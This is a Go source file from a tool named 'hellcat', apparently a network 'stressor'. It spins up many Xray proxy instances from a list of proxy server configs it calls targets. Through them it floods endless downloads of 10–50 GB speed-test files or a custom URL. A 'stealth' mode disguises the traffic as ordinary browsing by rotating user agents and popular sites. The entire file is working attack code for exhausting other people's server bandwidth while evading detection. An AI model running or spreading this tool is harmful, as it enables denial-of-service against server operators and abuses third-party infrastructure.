// [hellcat]
package stressor

import (
    "crypto/tls"
    "fmt"
    "io"
    "log"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "runtime"
    "sync/atomic"
    "time"

    "hellcat/config"
    "hellcat/parser"
)

var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
}

var payloads = []string{
    "https://speed.cloudflare.com/__down?bytes=10737418240", // 10 GB
    "https://speed.cloudflare.com/__down?bytes=50000000000", // 50 GB
    "http://speedtest.tele2.net/10GB.zip",
    "http://speedtest.tele2.net/1GB.zip",
    "http://proof.ovh.net/files/10Gb.dat",
    "https://proof.ovh.net/files/10Gb.dat",
    "http://proof.ovh.net/files/1Gb.dat",
    "http://bouygues.iperf.fr/10G.iso",
    "http://speedtest.ftp.otenet.gr/files/test1Gb.db",
    "https://speed.hetzner.de/1GB.bin",
    "https://speed.hetzner.de/100MB.bin",
    "http://ipv4.download.thinkbroadband.com/1GB.zip",
    "http://speedtest.zayo.com/1gbfile",
}

var stealthURLs = []string{
    "https://www.google.com/",
    "https://www.google.com/search?q=test+search+query",
    "https://www.youtube.com/",
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://x.com/i/flow/login",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://www.reddit.com/r/popular/.json?limit=100",
    "https://www.amazon.com/",
    "https://www.amazon.com/s?k=laptop",
    "https://www.microsoft.com/en-us/windows",
    "https://www.apple.com/shop/buy-mac/macbook-pro",
    "https://www.github.com/",
    "https://www.stackoverflow.com/",
    "https://www.wikipedia.org/",
    "https://en.wikipedia.org/wiki/Main_Page",
    "https://www.cloudflare.com/",
    "https://www.netflix.com/",
    "https://www.twitch.tv/",
    "https://www.linkedin.com/",
    "https://www.dropbox.com/",
    "https://www.tiktok.com/",
    "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/South_West_View_of_St_Mary%27s_Church%2C_Rye.jpg/1280px-South_West_View_of_St_Mary%27s_Church%2C_Rye.jpg",
    "https://github.com/ArtalkJS/Artalk/releases/download/v2.8.2/artalk_v2.8.2_linux_amd64.tar.gz",
    "https://github.com/ArtalkJS/Artalk/releases/download/v2.8.2/artalk_v2.8.2_darwin_amd64.tar.gz",
    "https://releases.ubuntu.com/22.04/ubuntu-22.04.3-desktop-amd64.iso",
    "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb",
    "https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.module.min.js",
    "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js",
}

var (
    requests        uint64
    errors          uint64
    bytesDownloaded uint64
    activeWorkers   int32
    stealthMode     bool
    customURL       string
)

func getRandomPort() int {
    for i := 0; i < 100; i++ {
        port := rand.Intn(55000) + 10000
        ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
        if err == nil {
            ln.Close()
            return port
        }
    }
    ln, err := net.Listen("tcp", "127.0.0.1:0")
    if err != nil {
        return 0
    }
    port := ln.Addr().(*net.TCPAddr).Port
    ln.Close()
    return port
}

// Правильный расчет скорости без потери точности и округления до нуля
func formatSpeed(bytesPerSec float64) string {
    if bytesPerSec >= 1024*1024 {
        return fmt.Sprintf("%.1f MB/s", bytesPerSec/1024/1024)
    }
    if bytesPerSec >= 1024 {
        return fmt.Sprintf("%.0f KB/s", bytesPerSec/1024)
    }
    return fmt.Sprintf("%.0f B/s", bytesPerSec)
}

func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, insane bool, stealth bool, customTarget string) {
    stealthMode = stealth
    customURL = customTarget

    if customURL != "" {
        payloads = []string{customTarget}
        stealthURLs = []string{customTarget}
    }

    modeStr := "HEAVY BANDWIDTH"
    if stealthMode {
        modeStr = "STEALTH BANDWIDTH"
    }

    log.Printf("[hellcat] 🌊 %s MODE ENGAGED", modeStr)
    log.Printf("[hellcat] 📊 %d xray instances", numXray)
    log.Printf("[hellcat] 🎯 Loaded %d targets from list", len(cfgs))

    if len(cfgs) > 1 {
        for i, c := range cfgs {
            log.Printf("[hellcat] 🌐 [%d/%d] %s (%s)", i+1, len(cfgs), getTargetInfo(c), c.Protocol)
        }
    } else if len(cfgs) == 1 {
        log.Printf("[hellcat] 🌐 Primary: %s (%s)", getTargetInfo(cfgs[0]), cfgs[0].Protocol)
    }

    stop := make(chan struct{})
    if duration > 0 {
        log.Printf("[hellcat] ⏱️  Duration: %d sec", duration)
        time.AfterFunc(time.Duration(duration)*time.Second, func() {
            log.Println("[hellcat] ⏰ Stopping...")
            close(stop)
        })
    }

    proxies := make([]string, numXray)
    var configFiles []string

    log.Println("[hellcat] ⏳ Generating random configs and starting Xray instances...")
    for i := 0; i < numXray; i++ {
        cfg := cfgs[i%len(cfgs)]
        port := getRandomPort()
        confPath := config.GenerateWithPort(cfg, port)
        configFiles = append(configFiles, confPath)
        proxies[i] = fmt.Sprintf("socks5h://127.0.0.1:%d", port)
        go startXray(confPath, i, port)
        time.Sleep(150 * time.Millisecond)
    }

    log.Println("[hellcat] ⏳ Waiting for SOCKS proxies...")
    waitForProxies(proxies)

    clients := make([]*http.Client, numXray)
    for i, p := range proxies {
        proxyURL, _ := url.Parse(p)
        tr := &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
            DialContext: (&net.Dialer{
                Timeout:   30 * time.Second,
                KeepAlive: 30 * time.Second,
            }).DialContext,
            TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
            DisableKeepAlives:     false,
            MaxIdleConns:          10000,
            MaxIdleConnsPerHost:   10000,
            MaxConnsPerHost:       100000,
            IdleConnTimeout:       0,
            TLSHandshakeTimeout:   15 * time.Second,
            ResponseHeaderTimeout: 60 * time.Second,
        }
        clients[i] = &http.Client{Transport: tr, Timeout: 0}
    }

    streamsPerProxy := threads / numXray
    if streamsPerProxy < 5 {
        streamsPerProxy = 5
    }
    totalGoroutines := streamsPerProxy * numXray
    log.Printf("[hellcat] 🚀 Spawning %d heavy persistent streams (%d per proxy)...", totalGoroutines, streamsPerProxy)

    for i := 0; i < numXray; i++ {
        client := clients[i]
        for j := 0; j < streamsPerProxy; j++ {
            atomic.AddInt32(&activeWorkers, 1)
            go func(c *http.Client) {
                defer atomic.AddInt32(&activeWorkers, -1)
                for {
                    select {
                    case <-stop:
                        return
                    default:
                        if stealthMode {
                            stealthRequest(c)
                        } else {
                            downloadFull(c)
                        }
                    }
                }
            }(client)
        }
    }

    ticker := time.NewTicker(3 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-stop:
            goto cleanup
        case <-ticker.C:
            succ := atomic.LoadUint64(&requests)
            fail := atomic.LoadUint64(&errors)
            bytes := atomic.SwapUint64(&bytesDownloaded, 0)

            // Считаем точную скорость на основе байтов
            speed := formatSpeed(float64(bytes) / 3.0)
            goroutines := runtime.NumGoroutine()

            log.Printf("[hellcat] 🌊 %s | Total req: %d | Err: %d | Active: %d | Goroutines: %d",
                speed, succ, fail, atomic.LoadInt32(&activeWorkers), goroutines)
        }
    }

cleanup:
    time.Sleep(3 * time.Second)
    for _, f := range configFiles {
        os.Remove(f)
    }
    log.Println("[hellcat] ✅ Finished.")
}

func downloadFull(client *http.Client) {
    target := payloads[rand.Intn(len(payloads))]
    req, _ := http.NewRequest("GET", target, nil)
    req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        // ВАЖНО: Рассинхронизируем потоки при ошибке, чтобы не убить сеть (Thundering Herd)
        time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
        return
    }
    defer resp.Body.Close()

    n, err := io.Copy(io.Discard, resp.Body)
    
    // Считаем каждый байт, даже если коннект оборвался
    atomic.AddUint64(&bytesDownloaded, uint64(n))

    if n > 0 {
        atomic.AddUint64(&requests, 1)
        // Если сервер оборвал скачивание (ошибка есть, но байты пошли), 
        // делаем микро-паузу, чтобы не спамить реконнектами в одну миллисекунду
        if err != nil {
            time.Sleep(time.Duration(50+rand.Intn(150)) * time.Millisecond)
        }
    } else {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(200+rand.Intn(300)) * time.Millisecond)
    }
}

func stealthRequest(client *http.Client) {
    target := stealthURLs[rand.Intn(len(stealthURLs))]
    req, _ := http.NewRequest("GET", target, nil)
    req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")

    resp, err := client.Do(req)
    if err != nil {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
        return
    }
    defer resp.Body.Close()

    n, _ := io.Copy(io.Discard, resp.Body)
    
    atomic.AddUint64(&bytesDownloaded, uint64(n))

    if n > 0 {
        atomic.AddUint64(&requests, 1)
    } else {
        atomic.AddUint64(&errors, 1)
        time.Sleep(time.Duration(200+rand.Intn(300)) * time.Millisecond)
    }
}

func getTargetInfo(cfg *parser.OutboundConfig) string {
    var host string
    var port int
    var network string
    var security string

    if cfg.StreamSetting != nil {
        network = cfg.StreamSetting.Network
        security = cfg.StreamSetting.Security
    }

    switch s := cfg.Settings.(type) {
    case parser.VnextSettings:
        if len(s.Vnext) > 0 {
            host = s.Vnext[0].Address
            port = s.Vnext[0].Port
        }
    case parser.VMessSettings:
        if len(s.Vnext) > 0 {
            host = s.Vnext[0].Address
            port = s.Vnext[0].Port
        }
    case parser.ServerSettings:
        if len(s.Servers) > 0 {
            host = s.Servers[0].Address
            port = s.Servers[0].Port
        }
    }

    return fmt.Sprintf("%s:%d (%s/%s)", host, port, network, security)
}

func waitForProxies(proxies []string) {
    for _, proxy := range proxies {
        u, _ := url.Parse(proxy)
        addr := u.Host
        for i := 0; i < 20; i++ {
            conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
            if err == nil {
                conn.Close()
                break
            }
            time.Sleep(500 * time.Millisecond)
        }
    }
}

func startXray(configPath string, index int, port int) {
    cmd := exec.Command("xray", "-config", configPath)
    cmd.Stdout = nil
    cmd.Stderr = nil
    if err := cmd.Start(); err != nil {
        log.Printf("[hellcat] ❌ xray [%d] start: %v", index, err)
        return
    }
    log.Printf("[hellcat] ✓ xray [%d] PID %d Port %d", index, cmd.Process.Pid, port)
    go func() {
        if err := cmd.Wait(); err != nil {
            log.Printf("[hellcat] ⚠️  xray [%d] exited: %v", index, err)
        }
    }()
}
